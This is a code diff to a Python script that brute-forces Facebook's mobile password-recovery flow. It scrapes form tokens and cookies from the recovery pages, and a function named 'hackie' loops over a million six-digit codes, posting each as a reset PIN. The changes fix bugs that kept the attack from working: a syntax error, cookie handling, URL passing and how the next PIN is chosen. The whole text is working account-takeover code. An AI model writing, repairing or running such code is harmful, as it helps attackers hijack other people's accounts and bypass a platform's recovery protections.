@@ -86,8 +86,8 @@ def search():
     else:
       try:
         another = ("https://m.facebook.com:443/recover"+re.findall(r'<a href="/recover(.*?)" role', web.text).pop(0))
-        d = merge(d, session.cookies.get_dict())
-        COOKIES, FORM, URL, RD = try_another(d, another, web.url)
+        c = merge(c, session.cookies.get_dict())
+        COOKIES, FORM, URL, RD = try_another(c, another, web.url)
         return COOKIES, FORM, URL, RD
       except:
         try:
@@ -97,8 +97,7 @@ def search():
             FORM['lsd'] = re.findall(r'name="lsd" value="(.*?)"', web.text).pop(0)
             FORM['jazoest'] = re.findall(r'name="jazoest" value="(.*?)"', web.text).pop(0)
             ACTION =('https://m.facebook.com:443'+re.findall(r'<form method="post" action="(.*?)" id=', web.text).pop(0))
-            for i in web.cookies:
-              COOKIES[i.name] = i.value
+            COOKIES = merge(c, session.cookies.get_dict())
             return COOKIES, FORM, ACTION, web.url
           
           else:
@@ -203,7 +202,7 @@ def elsi(web, body):
   body['jazoest'] = re.findall(r'name="jazoest" value="(.*?)"', web.text).pop(0)
  # FORMS['reset_action'] = 'Magpatuloy'
   body['reset_action'] = '1'
-  return body
+  return body, url
 def machine_found(web):
   form=dict()
   form['lsd']=re.findall(r'name="lsd" value="(.*?)"', web.text).pop(0)
@@ -224,7 +223,7 @@ def hackie(arg):
       if len(codelist) == 1000000:
         pass
       else:
-        sys.stdout.write(u'\033[1000D\033[1;97m {}/1000000/{}  \033[1;92m {}'.format(str(total),str(len(codelist)) str(pin)))
+        sys.stdout.write(u'\033[1000D\033[1;97m {}/1000000/{}  \033[1;92m {}'.format(str(total),str(len(codelist)), str(pin)))
         sys.stdout.flush()
       body["n"]=str(pin)
       web = session.post(url, headers = header, cookies = cookie, data = body)
@@ -242,19 +241,13 @@ def hackie(arg):
         RUN = False
         return
       else:
-        body = elsi(web, body)
+        body, url = elsi(web, body)
         header['Referer'] = web.url
+        pin = random.choice(codelist)
         try:
-          pin = codelist.pop(random.randint(0, 500))
+          codelist.remove(str(pin))
         except:
-          try:
-            pin = codelist.pop(random.randint(0, 50))
-          except:
-            try:
-              pin = random.choice(codelist)
-              codelist.remove(str(pin))
-            except:
-              pass
+          pass
         total+=1
     except:
       pass
